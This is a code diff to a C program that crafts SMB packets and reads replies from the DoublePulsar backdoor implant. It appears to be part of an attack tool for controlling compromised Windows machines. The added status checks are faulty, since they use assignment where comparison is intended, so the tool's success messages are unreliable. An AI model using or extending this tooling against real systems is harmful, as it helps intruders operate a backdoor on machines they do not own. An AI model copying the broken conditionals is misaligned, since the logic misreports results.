@@ -452,7 +452,7 @@ int main(int argc, char* argv[])
 	memcpy(packet + 3, &smblen, 1);
 
 	//update UserID in modified TreeConnect Request
-	memcpy(packet + 0x20, (char*)&userid, 2); //update userid
+	memcpy(packet + 0x20, (unsigned char*)&userid, 2); //update userid
 
 	//send modified TreeConnect request
 	send(sock, (char*)packet, ptr - packet, 0);
@@ -886,9 +886,23 @@ int main(int argc, char* argv[])
 
 		SMB_TRANS2_RESPONSE* transaction_response = (SMB_TRANS2_RESPONSE*)recvbuff;
 
+		//DoublePulsar response: STATUS_NOT_IMPLEMENTED
+		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
+		{
+			printf("All data sent and got good response from DoublePulsar!\n");
+		}
+		
 		if (transaction_response->multipleID = 0x52)
 		{
 			printf("Doublepulsar succeeded!\n");
+		}
+		if (transaction_response->multipleID = 0x62)
+		{
+			printf("Doublepulsar returned: Invalid parameters!\n");
+		}
+		else if (transaction_response->multipleID = 0x72)
+		{
+			printf("Doublepulsar returned: Allocation failure!\n");
 		}
 		else {
 			printf("Doublepulsar execute command failed!\n");
